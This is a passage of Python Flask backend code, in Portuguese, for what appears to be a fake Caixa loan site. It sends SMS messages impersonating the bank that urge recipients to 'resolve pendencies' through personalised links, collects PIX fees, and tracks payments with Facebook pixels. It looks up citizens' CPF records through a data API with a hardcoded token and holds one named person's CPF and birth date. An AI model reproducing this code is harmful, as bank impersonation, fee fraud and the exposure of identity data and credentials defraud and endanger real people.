                app.logger.info(f"[PROD] Telefone válido para SMS: {formatted_phone}")
        
        # Verificar status na API de pagamento
        api = get_payment_gateway()
        status_data = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
        
        # Verificar se o pagamento foi aprovado
        is_completed = status_data.get('status') == 'completed'
        is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
        
        # Construir o URL personalizado para a página de agradecimento (sempre criar, independentemente do status)
        thank_you_url = request.url_root.rstrip('/') + '/obrigado'
        
        # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
        bank = request.args.get('bank', 'Caixa Econômica Federal')
        pix_key = request.args.get('pix_key', cpf if cpf else '')
        loan_amount = request.args.get('loan_amount', '4000')
        
        if is_completed or is_approved:
            app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente para evitar problemas de encurtamento
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                app.logger.info(f"[PROD] Preparando envio de SMS para {phone}")
                
                # Fazer várias tentativas de envio direto usando SMSDEV
                max_attempts = 3
                attempt = 0
                sms_sent = False
                
                while attempt < max_attempts and not sms_sent:
                    attempt += 1
                    try:
                        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
                        
                        # Formatar o nome para exibição
                        nome_formatado = nome.split()[0] if nome else "Cliente"
                        
                        # Mensagem personalizada com link para thank_you_url
                        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
                        
                        # Chamar diretamente a função SMSDEV
                        sms_sent = send_sms_smsdev(phone, message)
                        
                        if sms_sent:
                            app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
                            break
                        else:
                            app.logger.warning(f"[PROD] Falha ao enviar SMS diretamente na tentativa {attempt}/{max_attempts}")
                            time.sleep(1.5)  # Intervalo maior entre tentativas
                    except Exception as e:
                        app.logger.error(f"[PROD] Erro na tentativa {attempt} de envio direto via SMSDEV: {str(e)}")
                        time.sleep(1.0)
                
                # Tente a função especializada como backup se as tentativas diretas falharem
                if not sms_sent:
                    app.logger.warning(f"[PROD] Tentativas diretas falharam, usando função de confirmação de pagamento")
                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                
                if sms_sent:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Todas as tentativas de envio de SMS falharam para {phone}")
        else:
            app.logger.info(f"[PROD] Pagamento {transaction_id} ainda não aprovado. Status: {status_data.get('status')}")
        
        # Adicionar informações extras ao status para o frontend
        status_data['phone_provided'] = bool(phone)
        # Como thank_you_url é sempre definido agora, podemos simplificar a lógica
        if is_completed or is_approved:
            status_data['thank_you_url'] = thank_you_url
        else:
            status_data['thank_you_url'] = None
        
        return jsonify(status_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/verificar-cpf')
@app.route('/verificar-cpf/<cpf>')
def verificar_cpf(cpf=None):
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    if cpf:
        # Remover qualquer formatação do CPF se houver (pontos e traços)
        cpf_limpo = re.sub(r'[^\d]', '', cpf)
        app.logger.info(f"[PROD] CPF fornecido via URL: {cpf_limpo}")
        return render_template('verificar-cpf.html', cpf_preenchido=cpf_limpo)
    return render_template('verificar-cpf.html')

@app.route('/api/create-discount-payment', methods=['POST'])
@secure_api('create_discount_payment')
def create_discount_payment():
    try:
        # Obter os dados do usuário da requisição
        payment_data = request.get_json()
        
        if not payment_data:
            app.logger.error("[PROD] Dados de pagamento não fornecidos")
            return jsonify({"error": "Dados de pagamento não fornecidos"}), 400
        
        # Usar o gateway de pagamento configurado
        from payment_gateway import get_payment_gateway
        payment_api = get_payment_gateway()
        
        # Adaptar dados para o formato esperado pelo gateway
        # Garantir que os nomes de campos estejam no formato esperado
        formatted_data = {
            'name': payment_data.get('nome', payment_data.get('name', '')),
            'cpf': payment_data.get('cpf', ''),
            'phone': payment_data.get('telefone', payment_data.get('phone', '')),
            'email': payment_data.get('email', ''),
            'amount': 49.70  # Valor fixo para pagamento com desconto
        }
        
        # Criar o pagamento PIX usando o gateway configurado
        app.logger.info(f"[PROD] Criando pagamento PIX com desconto para CPF: {formatted_data.get('cpf', 'N/A')}")
        result = payment_api.create_pix_payment(formatted_data)
        
        if "error" in result:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX com desconto: {result['error']}")
            return jsonify(result), 500
        
        app.logger.info("[PROD] Pagamento PIX com desconto criado com sucesso")
        return jsonify(result)
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao criar pagamento com desconto: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-payment-status')
@secure_api('check_payment_status')
def check_discount_payment_status():
    try:
        payment_id = request.args.get('id')
        
        if not payment_id:
            app.logger.error("[PROD] ID de pagamento não fornecido")
            return jsonify({"error": "ID de pagamento não fornecido"}), 400
        
        # Usar o gateway de pagamento configurado
        from payment_gateway import get_payment_gateway
        payment_api = get_payment_gateway()
        
        # Verificar o status do pagamento
        app.logger.info(f"[PROD] Verificando status do pagamento com desconto: {payment_id}")
        result = payment_api.check_payment_status(payment_id)
        
        if "error" in result:
            app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {result['error']}")
            return jsonify(result), 500
        
        app.logger.info(f"[PROD] Status do pagamento verificado: {result.get('status', 'N/A')}")
        return jsonify(result)
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/buscar-cpf')
def buscar_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500
        
        app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
        return render_template('buscar-cpf.html', verification_token=verification_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar busca de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/proxy-consulta-cpf', methods=['POST'])
def proxy_consulta_cpf():
    """API proxy para consulta de CPF na API Exato Digital"""
    try:
        # Obter o CPF do corpo da requisição
        data = request.get_json()
        if not data or 'cpf' not in data:
            app.logger.error("[PROD] CPF não fornecido na requisição")
            return jsonify({"error": "CPF não fornecido"}), 400
            
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = data['cpf'].replace('.', '').replace('-', '')
        
        # Token da API Exato Digital
        token = "268753a9b3a24819ae0f02159dee6724"
        
        # URL de consulta da API Exato Digital
        url = f"https://api.exato.digital/receita-federal/cpf?token={token}&cpf={cpf_numerico}&format=json"
        
        app.logger.info(f"[PROD] Consultando CPF {cpf_numerico} na API Exato Digital")
        
        try:
            # Fazer a requisição para a API Exato Digital
            response = requests.get(url, timeout=10)
            app.logger.info(f"[PROD] Status da resposta da API Exato: {response.status_code}")
            
            if response.status_code == 200:
                # Se a consulta for bem-sucedida, retornar os dados recebidos
                api_data = response.json()
                app.logger.info(f"[PROD] Dados do CPF {cpf_numerico} obtidos com sucesso")
                return jsonify(api_data)
            else:
                # Em caso de erro na API, usar dados de exemplo como fallback
                app.logger.error(f"[PROD] Erro na consulta à API Exato: {response.status_code}")
                
                # Para o CPF específico fornecido nos exemplos
                if cpf_numerico == "15896074654":
                    # Criar resposta com os dados do exemplo fornecido
                    sample_data = {
                        "UniqueIdentifier": "cxrlu9d50g8h4mzpv6a07jj55",
                        "TransactionResultTypeCode": 1,
                        "TransactionResultType": "Success",
                        "Message": "Sucesso",
                        "TotalCostInCredits": 1,
                        "BalanceInCredits": -4,
                        "ElapsedTimeInMilliseconds": 110,
                        "Reserved": None,
                        "Date": "2025-04-16T23:06:37.4127718-03:00",
                        "OutdatedResult": True,
                        "HasPdf": False,
                        "DataSourceHtml": None,
                        "DateString": "2025-04-16T23:06:37.4127718-03:00",
                        "OriginalFilesUrl": "https://api.exato.digital/services/original-files/cxrlu9d50g8h4mzpv6a07jj55",
                        "PdfUrl": None,
                        "TotalCost": 0,
                        "BalanceInBrl": None,
                        "DataSourceCategory": "Sem categoria",
                        "Result": {
                            "NumeroCpf": "158.960.746-54",
                            "NomePessoaFisica": "PEDRO LUCAS MENDES SOUZA",
                            "DataNascimento": "2006-12-13T00:00:00.0000000",
                            "SituacaoCadastral": "REGULAR",
                            "DataInscricaoAnterior1990": False,
                            "ConstaObito": False,
                            "DataEmissao": "2025-04-10T20:28:08.4287800",
                            "Origem": "ReceitaBase",
                            "SituacaoCadastralId": 1
                        }
                    }
                    app.logger.info(f"[PROD] Retornando dados de exemplo para o CPF 158.960.746-54")
                    return jsonify(sample_data)
                else:
                    return jsonify({"error": f"Erro na consulta à API Exato Digital: {response.status_code}"}), 500
        
        except requests.RequestException as e:
            app.logger.error(f"[PROD] Erro na requisição para a API Exato: {str(e)}")
            return jsonify({"error": f"Erro na requisição para a API Exato: {str(e)}"}), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro no proxy de consulta de CPF: {str(e)}")
        return jsonify({"error": f"Erro ao consultar CPF: {str(e)}"}), 500

@app.route('/input-cpf')
def input_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500

        app.logger.info("[PROD] Acessando página de entrada de CPF: input_cpf.html")
        return render_template('input_cpf.html', verification_token=verification_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar entrada de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/analisar-cpf')
def analisar_cpf():
    try:
        app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
        # Usar o token fixo da API Exato Digital que já está funcionando na função consultar_cpf_inscricao
        exato_api_token = os.environ.get('EXATO_API_TOKEN', "268753a9b3a24819ae0f02159dee6724")
        
        return render_template('analisar_cpf.html', exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar análise de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/opcoes-emprestimo')
def opcoes_emprestimo():
    try:
        # Get query parameters
        cpf = request.args.get('cpf')
        nome = request.args.get('nome')
        
        if not cpf or not nome:
            app.logger.error("[PROD] CPF ou nome não fornecidos")
            return redirect('/input-cpf')
            
        app.logger.info(f"[PROD] Acessando página de opções de empréstimo para CPF: {cpf}")
        return render_template('opcoes_emprestimo.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar opções de empréstimo: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/aviso')
def seguro_prestamista():
    try:
        # Get customer data from query parameters
        customer = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'pix_key': request.args.get('pix_key', ''),
            'bank': request.args.get('bank', ''),
            'amount': request.args.get('amount', '0'),
            'term': request.args.get('term', '0')
        }
        
        app.logger.info(f"[PROD] Renderizando página de aviso sobre seguro prestamista: {customer}")
        return render_template('aviso.html', customer=customer)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de aviso: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/obrigado')
def thank_you():
    try:
        # Get customer data from query parameters if available
        customer = {
            'name': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'bank': request.args.get('bank', 'Caixa Econômica Federal'),
            'pix_key': request.args.get('pix_key', ''),
            'loan_amount': request.args.get('loan_amount', '4000')
        }
        
        app.logger.info(f"[PROD] Renderizando página de agradecimento com dados: {customer}")
        meta_pixel_id = os.environ.get('META_PIXEL_ID')
        return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/csrf-token', methods=['GET'])
@secure_api('csrf_token')
def get_csrf_token():
    """
    Gera um novo token CSRF para proteção contra ataques CSRF
    """
    try:
        # Gerar token CSRF para proteção adicional
        csrf_token = generate_csrf_token()
        
        # Registrar um log da geração do token
        client_ip = get_client_ip()
        app.logger.info(f"[SECURANÇA] Novo token CSRF gerado para IP: {client_ip}")
        
        return jsonify({
            'csrf_token': csrf_token,
            'expires_in': 3600  # 1 hora em segundos
        })
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar token CSRF: {str(e)}")
        return jsonify({'error': 'Erro interno ao gerar token de segurança'}), 500

@app.route('/get-payment-token', methods=['POST'])
@secure_api('get_payment_token')
def get_payment_token():
    """
    Gera um token JWT que autoriza a criação de um pagamento PIX
    Este token deve ser incluído nas requisições subsequentes para criar o pagamento
    """
    try:
        # Dados do cliente (podem vir de um formulário ou sessão)
        client_data = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'timestamp': int(time.time())
        }
        
        # Criar token JWT válido por 10 minutos
        token = create_jwt_token(client_data)
        
        # Gerar token CSRF para proteção adicional
        csrf_token = generate_csrf_token()
        
        return jsonify({
            'auth_token': token,
            'csrf_token': csrf_token,
            'expires_in': 10 * 60  # 10 minutos em segundos
        })
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar token de pagamento: {str(e)}")
        return jsonify({'error': 'Erro interno ao gerar token de pagamento'}), 500

@app.route('/create-pix-payment', methods=['POST'])
@secure_api('create_pix_payment')
def create_pix_payment():
    try:
        # Validar dados da requisição
        if not request.is_json:
            app.logger.error("[PROD] Requisição inválida: conteúdo não é JSON")
            return jsonify({'error': 'Requisição inválida: formato JSON esperado'}), 400
            
        data = request.json
        
        # Verificar campos obrigatórios
        required_fields = ['name', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
                return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
                
        # Se o telefone estiver presente na requisição, garantir que esteja formatado corretamente
        if 'phone' in data and data['phone']:
            # Limpar caracteres não numéricos do telefone
            data['phone'] = ''.join(filter(str.isdigit, data['phone']))
            app.logger.info(f"[PROD] Telefone fornecido na requisição JSON: {data['phone']}")
        
        app.logger.info(f"[PROD] Iniciando criação de pagamento PIX: {data}")
        
        # Usar a API NovaEra (padrão da aplicação via payment_gateway)
        from payment_gateway import get_payment_gateway
        
        try:
            # Obtém o gateway padrão configurado que deve ser NovaEra
            api = get_payment_gateway()
            app.logger.info("[PROD] API de pagamento inicializada com sucesso")
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar API de pagamento: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento. Tente novamente mais tarde.'}), 500
        
        # Verificar se este cliente está atingindo o limite de transações
        from transaction_tracker import track_transaction_attempt, get_client_ip
        
        # Obter o IP do cliente para rastreamento
        client_ip = get_client_ip()
        
        # Verificar limites de transação por nome, CPF e telefone
        is_allowed, message = track_transaction_attempt(client_ip, {
            'name': data.get('name'),
            'cpf': data.get('cpf'),
            'phone': data.get('phone', '')
        })
        
        if not is_allowed:
            app.logger.warning(f"[PROD] Bloqueio de transação: {message}")
            return jsonify({'error': f'Limite de transações atingido: {message}'}), 429
            
        # Criar o pagamento PIX
        try:
            # Padronizar os nomes dos campos para corresponder ao esperado pela API
            payment_data = {
                'name': data.get('name'),
                'email': data.get('email', ''),
                'cpf': data.get('cpf'),
                'phone': data.get('phone', ''),
                'amount': data.get('amount')
            }
            
            payment_result = api.create_pix_payment(payment_data)
            app.logger.info(f"[PROD] Pagamento PIX criado com sucesso: {payment_result}")
            
            # Construir resposta com suporte a ambos formatos (NovaEra e For4Payments)
            response = {
                'transaction_id': payment_result.get('id'),
                'pix_code': payment_result.get('pix_code') or payment_result.get('copy_paste'),
                'pix_qr_code': payment_result.get('pix_qr_code') or payment_result.get('qr_code_image'),
                'status': payment_result.get('status', 'pending')
            }
            
            # Salvar os dados da transação PIX no banco de dados para remarketing
            try:
                # Obter o ID da transação
                transaction_id = payment_result.get('id') or f"PIX-{int(time.time())}"
                
                # Obter o valor do pagamento
                amount = float(data.get('amount', 0))
                
                # Obter o nome do produto (padrão "Mounjaro")
                product_name = data.get('product_name', 'Mounjaro (Tirzepatida) 5mg')
                
                # Salvar no banco de dados com status "pending"
                save_purchase_to_db(
                    transaction_id=transaction_id,
                    amount=amount,
                    product_name=product_name
                )
                
                app.logger.info(f"[DB] Pagamento PIX pendente salvo no banco para remarketing: {transaction_id}")
            except Exception as db_error:
                app.logger.error(f"[DB] Erro ao salvar pagamento PIX no banco: {str(db_error)}")
                # Não interromper o fluxo em caso de erro de banco de dados
            
            # Log detalhado para depuração
            app.logger.info(f"[PROD] Resposta formatada: {response}")
            
            # Para For4Payments, pode ser necessário extrair campos específicos
            if os.environ.get('GATEWAY_CHOICE') == 'FOR4':
                app.logger.info(f"[PROD] Usando gateway For4, verificando campos específicos...")
                
                # Verificar campos raw na resposta original
                if 'pixCode' in payment_result:
                    response['pix_code'] = payment_result.get('pixCode')
                    app.logger.info(f"[PROD] Usando campo pixCode: {response['pix_code'][:30]}...")
                elif 'copy_paste' in payment_result:
                    response['pix_code'] = payment_result.get('copy_paste')
                    app.logger.info(f"[PROD] Usando campo copy_paste: {response['pix_code'][:30]}...")
                    
                if 'pixQrCode' in payment_result:
                    response['pix_qr_code'] = payment_result.get('pixQrCode')
                    app.logger.info(f"[PROD] Usando campo pixQrCode")
                elif 'qr_code_image' in payment_result:
                    response['pix_qr_code'] = payment_result.get('qr_code_image')
                    app.logger.info(f"[PROD] Usando campo qr_code_image")
            
            return jsonify(response)
            
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': str(e)}), 400
        except Exception as e:
            app.logger.error(f"[PROD] Erro inesperado ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': 'Erro ao processar pagamento. Tente novamente mais tarde.'}), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao processar requisição: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/verificar-pagamento', methods=['POST'])
@secure_api('check_payment_status')
def verificar_pagamento():
    try:
        data = request.get_json()
        transaction_id = data.get('transactionId')
        
        if not transaction_id:
            app.logger.error("[PROD] ID da transação não fornecido")
            return jsonify({'error': 'ID da transação é obrigatório', 'status': 'error'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")
        
        # Usar a API de pagamento configurada
        api = get_payment_gateway()
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento: {status_result}")
        
        # Se o pagamento foi confirmado, registrar evento do Facebook Pixel
        # Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('APPROVED', 'PAID', 'COMPLETED')
        if (status_result.get('status') == 'completed' or 
            status_result.get('status') == 'paid' or
            status_result.get('status') == 'PAID' or 
            status_result.get('status') == 'COMPLETED' or 
            status_result.get('status') == 'APPROVED' or
            status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
            app.logger.info(f"[PROD] Pagamento confirmado, ID da transação: {transaction_id}")
            app.logger.info(f"[FACEBOOK_PIXEL] Registrando evento de conversão para os pixels: 1418766538994503, 1345433039826605 e 1390026985502891")
            
            # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
            status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605', '1390026985502891']
            
            # Atualizar ou criar registro de compra no banco de dados
            try:
                # Verificar se temos o valor na resposta da API ou nos dados do pagamento
                payment_amount = status_result.get('amount', 0)
                
                # Para For4Payments, o valor pode estar em centavos
                if isinstance(payment_amount, int) and payment_amount > 1000:
                    payment_amount = payment_amount / 100
                
                # Se não houver valor, usar valor padrão para evitar erros
                if not payment_amount:
                    payment_amount = 143.10
                
                # Obter nome do produto
                product_name = "Mounjaro (Tirzepatida) 5mg"
                if abs(float(payment_amount) - 67.90) < 0.01:
                    product_name = "Taxa Tarja Preta Seguro"
                
                # Atualizar ou criar no banco de dados
                if database_url:
                    try:
                        from models import Purchase, db
                        
                        # Verificar se já existe no banco
                        existing_purchase = Purchase.query.filter_by(transaction_id=transaction_id).first()
                        
                        if existing_purchase:
                            # Atualizar status para completed
                            existing_purchase.status = 'completed'
                            existing_purchase.updated_at = datetime.utcnow()
                            db.session.commit()
                            app.logger.info(f"[DB] Compra atualizada no banco de dados: {transaction_id}")
                        else:
                            # Criar novo registro
                            save_purchase_to_db(
                                transaction_id=transaction_id,
                                amount=float(payment_amount),
                                product_name=product_name
                            )
                    except Exception as db_error:
                        app.logger.error(f"[DB] Erro ao atualizar/criar compra no banco: {str(db_error)}")
            except Exception as e:
                app.logger.error(f"[PROD] Erro ao salvar dados de compra confirmada: {str(e)}")
            
            # Verificar se é um pagamento de R$ 143,10 para redirecionamento para /livro
            try:
                # Verificar se temos o valor na resposta da API ou nos dados do pagamento
                payment_amount = status_result.get('amount', 0)
                
                # Para For4Payments, o valor pode estar em centavos
                if isinstance(payment_amount, int) and payment_amount > 1000:
                    payment_amount = payment_amount / 100
                
                app.logger.info(f"[PROD] Valor do pagamento: {payment_amount}")
                
                # Verificar se é o valor específico de R$ 143,10
                if abs(float(payment_amount) - 143.10) < 0.01:
                    app.logger.info(f"[PROD] Pagamento de R$ 143,10 detectado. Configurando redirecionamento para /livro")
                    status_result['redirect_to'] = '/livro'
                else:
                    app.logger.info(f"[PROD] Pagamento com outro valor: {payment_amount}. Redirecionamento padrão para /obrigado")
            except Exception as e:
                app.logger.error(f"[PROD] Erro ao verificar valor do pagamento: {str(e)}")
                # Continuar com o fluxo normal se houver erro na verificação do valor
        
        return jsonify(status_result)
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'error': f'Erro ao verificar status: {str(e)}', 'status': 'error'}), 500

@app.route('/check-for4payments-status', methods=['GET', 'POST'])
@secure_api('check_for4payments_status')  # Usar o limite específico mais alto para verificação de For4Payments
def check_for4payments_status():
    try:
        transaction_id = request.args.get('transaction_id')
        
        if not transaction_id:
            # Verificar se foi enviado no corpo da requisição (compatibilidade)
            data = request.get_json(silent=True)
            if data and data.get('id'):
                transaction_id = data.get('id')
            else:
                app.logger.error("[PROD] ID da transação não fornecido")
                return jsonify({'error': 'ID da transação é obrigatório'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")
        
        # Usar o gateway de pagamento configurado
        try:
            api = get_payment_gateway()
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar gateway de pagamento: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento.'}), 500
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento: {status_result}")
        
        # Verificar se o pagamento foi aprovado
        # Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('APPROVED', 'PAID', 'COMPLETED')
        if (status_result.get('status') == 'completed' or 
            status_result.get('status') == 'paid' or
            status_result.get('status') == 'PAID' or 
            status_result.get('status') == 'COMPLETED' or 
            status_result.get('status') == 'APPROVED' or
            status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
            # Obter informações do usuário dos parâmetros da URL ou da sessão
            nome = request.args.get('nome', '')
            cpf = request.args.get('cpf', '')
            phone = request.args.get('phone', '')
            
            # Verificar se o pagamento é do valor específico de R$ 143,10
            try:
                # Tentar obter o valor do pagamento das informações da transação
                payment_amount = status_result.get('amount')
                app.logger.info(f"[PROD] Valor do pagamento: {payment_amount}")
                
                # Se o valor for exatamente 143.10, preparar redirecionamento para a página do livro
                if payment_amount == 143.10:
                    app.logger.info(f"[PROD] Pagamento de R$ 143,10 confirmado. Redirecionando para /livro")
                    # Este campo extra será usado pelo JavaScript para redirecionar
                    status_result['redirect_to'] = '/livro'
            except Exception as e:
                app.logger.error(f"Erro ao verificar valor do pagamento: {str(e)}")
            
            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
            bank = request.args.get('bank', 'Caixa Econômica Federal')
            pix_key = request.args.get('pix_key', cpf if cpf else '')
            loan_amount = request.args.get('loan_amount', '4000')
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                # Usando a função especializada para enviar SMS de confirmação de pagamento
                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                if success:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'status': 'pending', 'error': str(e)})

@app.route('/send-verification-code', methods=['POST'])
def send_verification_code_route():
    try:
        data = request.json
        phone_number = data.get('phone')

        if not phone_number:
            return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400

        success, result = send_verification_code(phone_number)

        if success:
            # Store the verification code temporarily (in a real app, this should use Redis or similar)
            # For demo purposes, we'll just return it directly (not ideal for security)
            return jsonify({
                'success': True, 
                'message': 'Código enviado com sucesso',
                'verification_code': result  # In a real app, don't send this back to client
            })
        else:
            return jsonify({'success': False, 'message': result}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar código de verificação: {str(e)}")
        return jsonify({'success': False, 'message': 'Erro ao enviar código de verificação'}), 500

@app.route('/atualizar-cadastro', methods=['POST'])
def atualizar_cadastro():
    try:
        app.logger.info("[PROD] Recebendo atualização cadastral")
        # Log form data for debugging
        app.logger.debug(f"Form data: {request.form}")

        # Extract form data
        data = {
            'birth_date': request.form.get('birth_date'),
            'cep': request.form.get('cep'),
            'employed': request.form.get('employed'),
            'salary': request.form.get('salary'),
            'household_members': request.form.get('household_members')
        }

        app.logger.info(f"[PROD] Dados recebidos: {data}")

        # Aqui você pode adicionar a lógica para processar os dados
        # Por enquanto, vamos apenas redirecionar para a página de pagamento
        nome = request.form.get('nome', '')
        cpf = request.form.get('cpf', '')
        phone = request.form.get('phone', '')  # Obter número de telefone do formulário

        return redirect(url_for('payment_update', nome=nome, cpf=cpf, phone=phone))

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
        return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500

@app.route('/sms-config')
def sms_config():
    try:
        # Check SMS API key status
        smsdev_status = bool(os.environ.get('SMSDEV_API_KEY'))
        owen_status = bool(os.environ.get('SMS_OWEN_TOKEN'))

        # Get test result from session if available
        test_result = session.pop('test_result', None)
        test_success = session.pop('test_success', None)

        return render_template('sms_config.html',
                              current_api=SMS_API_CHOICE,
                              smsdev_status=smsdev_status,
                              owen_status=owen_status,
                              test_result=test_result,
                              test_success=test_success)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar configuração SMS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/update-sms-config', methods=['POST'])
def update_sms_config():
    try:
        sms_api = request.form.get('sms_api', 'SMSDEV')

        # In a real application, this would be saved to a database
        # But for this demo, we'll use a global variable
        global SMS_API_CHOICE
        SMS_API_CHOICE = sms_api

        app.logger.info(f"[PROD] API SMS atualizada para: {sms_api}")

        # We would typically use Flask's flash() here, but for simplicity we'll use a session variable
        session['test_result'] = f"Configuração atualizada para {sms_api}"
        session['test_success'] = True

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar configuração SMS: {str(e)}")
        session['test_result'] = f"Erro ao atualizar configuração: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/send-test-sms', methods=['POST'])
def send_test_sms():
    try:
        phone = request.form.get('phone', '')

        if not phone:
            session['test_result'] = "Por favor, forneça um número de telefone válido"
            session['test_success'] = False
